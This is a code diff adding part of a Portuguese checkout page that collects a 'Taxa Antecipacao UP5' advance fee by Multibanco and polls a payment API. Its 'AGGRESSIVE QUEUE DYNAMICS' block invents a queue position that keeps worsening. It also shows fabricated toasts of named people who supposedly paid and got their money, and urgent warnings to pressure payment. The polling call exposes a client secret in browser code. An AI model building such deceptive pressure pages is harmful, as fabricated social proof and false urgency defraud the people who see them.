+        var ref = tx.referenceData;
+        function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
+        content.innerHTML = '<div class="payment-instructions"><h2>Paga com Multibanco</h2><div class="amount-display">\u20AC' + AMOUNT.toFixed(2) + '</div>'
+          + '<p style="font-size:14px;font-weight:600;margin-bottom:12px;">Utiliza os dados abaixo para pagar num terminal Multibanco ou na app do teu banco.</p>'
+          + '<div class="multibanco-reference">'
+          + '<div class="reference-item"><span class="reference-label">Entidade:</span><span class="reference-value">' + esc(ref.entity) + '</span></div>'
+          + '<div class="reference-item"><span class="reference-label">Referencia:</span><span class="reference-value">' + esc(ref.reference) + '</span></div>'
+          + '<div class="reference-item"><span class="reference-label">Valor:</span><span class="reference-value">\u20AC' + AMOUNT.toFixed(2) + '</span></div>'
+          + (ref.expiresAt ? '<div class="reference-item"><span class="reference-label">Valido ate:</span><span class="reference-value">' + esc(ref.expiresAt) + '</span></div>' : '')
+          + '</div>'
+          + '<button class="copy-ref-btn" id="copy-ref-btn" data-entity="' + esc(ref.entity) + '" data-reference="' + esc(ref.reference) + '" data-amount="' + AMOUNT.toFixed(2) + '">Copiar Referencia</button>'
+          + '<div class="waiting-message"><div class="spinner"></div><p>A aguardar confirmacao do pagamento...</p></div>'
+          + '</div>';
+        setTimeout(function(){
+          var copyBtn = document.getElementById('copy-ref-btn');
+          if(copyBtn){
+            copyBtn.addEventListener('click', function(){
+              var text = 'Entidade: ' + copyBtn.dataset.entity + '\nReferencia: ' + copyBtn.dataset.reference + '\nValor: \u20AC' + copyBtn.dataset.amount;
+              (navigator.clipboard ? navigator.clipboard.writeText(text) : Promise.reject()).then(function(){
+                copyBtn.textContent = 'Copiado!';
+                copyBtn.classList.add('copied');
+                setTimeout(function(){ copyBtn.textContent = 'Copiar Referencia'; copyBtn.classList.remove('copied'); }, 2000);
+              }).catch(function(){ window.prompt('Copia a referencia:', text); });
+            });
+          }
+        }, 100);
+      }
+    }
+
+    function startPolling(txId){
+      var checks = 0;
+      var iv = setInterval(async function(){
+        checks++;
+        try {
+          var r = await fetch(WAYMB.baseUrl + '/transactions/info', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id: txId, client_id: WAYMB.clientId, client_secret: WAYMB.clientSecret })
+          });
+          if(!r.ok) return;
+          var s = await r.json();
+          if(s.status === 'COMPLETED'){
+            clearInterval(iv);
+            try {
+              var payload = { content_type:'product', content_id:'up5_antecipacao', content_name:'Taxa Antecipacao UP5', value:AMOUNT, currency:CURRENCY, quantity:1, transaction_id:txId };
+              if(typeof ttq!=='undefined' && typeof ttq.track==='function'){ ttq.track('CompletePayment',payload); ttq.track('Purchase',payload); }
+            } catch(_){}
+            showSuccess();
+            setTimeout(function(){ window.location.href = SUCCESS_URL; }, 3000);
+            return;
+          } else if(s.status === 'FAILED' || s.status === 'CANCELLED' || s.status === 'DECLINED'){
+            clearInterval(iv);
+            content.innerHTML = '<div class="payment-instructions"><div class="error-badge"><span style="font-size:40px;">&#9888;</span><p class="error-message">Nao foi possivel processar o pagamento</p></div>'
+              + '<p style="margin:15px 0;font-size:14px;font-weight:600;">Verifica se o numero esta correto e se tens MB Way ativado.</p>'
+              + '<button class="checkout-submit-btn" onclick="location.reload()">Tentar Novamente</button></div>';
+            return;
+          }
+        } catch(_){}
+        if(checks >= 60){
+          clearInterval(iv);
+          content.innerHTML = '<div class="payment-instructions"><div class="error-badge"><span style="font-size:40px;">&#9888;</span><p class="error-message">Tempo de espera esgotado</p></div>'
+            + '<p style="margin:15px 0;font-size:14px;font-weight:600;">Nao recebemos a confirmacao. Se ja pagaste, aguarda uns minutos e recarrega a pagina.</p>'
+            + '<button class="checkout-submit-btn" onclick="location.reload()">Tentar Novamente</button></div>';
+        }
+      }, 5000);
+    }
+
+    function showSuccess(){
+      content.innerHTML = '<div class="payment-success">'
+        + '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg>'
+        + '<h2>Pagamento Confirmado!</h2>'
+        + '<p style="font-weight:600;">O teu pagamento foi processado com sucesso.</p>'
+        + '<p style="font-weight:600;">Seras redirecionado em breve...</p></div>';
+    }
+
+    window.onload = function(){
+      try { if(typeof ttq!=='undefined' && typeof ttq.track==='function') ttq.track('ViewContent', { content_type:'product', content_id:'up5_antecipacao', content_name:'Taxa Antecipacao UP5' }); } catch(_){}
+    };
+
+    /* ===== AGGRESSIVE QUEUE DYNAMICS ===== */
+
+    var queuePosition = 847;
+    var peopleSkipped = 14;
+    var queueNumberEl = document.getElementById('queue-number');
+    var queueInlineEl = document.getElementById('queue-inline');
+    var peopleSkippedEl = document.getElementById('people-skipped');
+    var pqBarFill = document.getElementById('pq-bar-fill');
+    var pqWarning = document.getElementById('pq-warning');
+    var subCtaText = document.getElementById('sub-cta-text');
+    var toastContainer = document.getElementById('toast-container');
+
+    var names = [
+      'Ricardo M.', 'Sara T.', 'Joao P.', 'Ana L.', 'Miguel S.',
+      'Catarina R.', 'Pedro F.', 'Mariana C.', 'Tiago A.', 'Ines B.',
+      'Bruno G.', 'Sofia D.', 'Diogo V.', 'Beatriz N.', 'Rui H.',
+      'Marta E.', 'Andre O.', 'Carolina K.', 'Hugo J.', 'Filipa W.',
+      'Daniel Q.', 'Leonor Z.', 'Nuno X.', 'Rita Y.', 'Gustavo I.'
+    ];
+
+    var toastMessages = [
+      '{name} saltou para posicao #1',
+      '{name} recebeu em 3 minutos',
+      '{name} desbloqueou a fila agora',
+      '{name} acabou de receber o dinheiro',
+      '{name} pagou a taxa e saltou a fila',
+      '{name} ja recebeu na conta',
+      '{name} passou a tua frente'
+    ];
+
+    function updateQueueDisplay(){
+      var increase = Math.floor(Math.random() * 3) + 1;
+      queuePosition += increase;
+      peopleSkipped += increase;
+
+      queueNumberEl.textContent = '#' + queuePosition;
+      queueNumberEl.style.animation = 'none';
+      void queueNumberEl.offsetWidth;
+      queueNumberEl.style.animation = 'queueDrop 0.4s ease';
+
+      if(queueInlineEl) queueInlineEl.textContent = '#' + queuePosition;
+      if(peopleSkippedEl) peopleSkippedEl.textContent = peopleSkipped;
+
+      var barWidth = Math.max(5, 85 - ((queuePosition - 847) * 0.5));
+      if(pqBarFill) pqBarFill.style.width = barWidth + '%';
+
+      var skipCount = Math.floor(Math.random() * 5) + 5;
+      if(subCtaText) subCtaText.innerHTML = '&#9889; ' + skipCount + ' pessoas saltaram a fila nos ultimos 10 minutos';
+
+      if(pqWarning){
+        var warnings = [
+          '&#9888; Estao a passar pessoas a tua frente agora mesmo',
+          '&#9888; A tua posicao caiu! Age antes que seja tarde',
+          '&#9888; URGENTE: mais ' + increase + ' pessoas acabaram de saltar',
+          '&#9888; Posicao critica — o tempo esta a acabar'
+        ];
+        pqWarning.innerHTML = warnings[Math.floor(Math.random() * warnings.length)];
+      }
+    }
+
+    function showToast(){
+      var name = names[Math.floor(Math.random() * names.length)];
+      var msgTemplate = toastMessages[Math.floor(Math.random() * toastMessages.length)];
+      var msg = msgTemplate.replace('{name}', name);
+
+      var toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.innerHTML = '<span class="toast-icon">&#9989;</span><span>' + msg + '</span>';
+      toastContainer.appendChild(toast);
+
+      setTimeout(function(){
+        toast.classList.add('exit');
+        setTimeout(function(){ toast.remove(); }, 400);
+      }, 4000);
+
+      if(toastContainer.children.length > 3){
+        toastContainer.firstChild.remove();
+      }
+    }
+
+    setInterval(updateQueueDisplay, 4000 + Math.random() * 2000);
+    setInterval(showToast, 6000 + Math.random() * 4000);
+
+    setTimeout(showToast, 3000);
+    setTimeout(updateQueueDisplay, 2000);
+
+  })();
+  </script>
+</body></html>
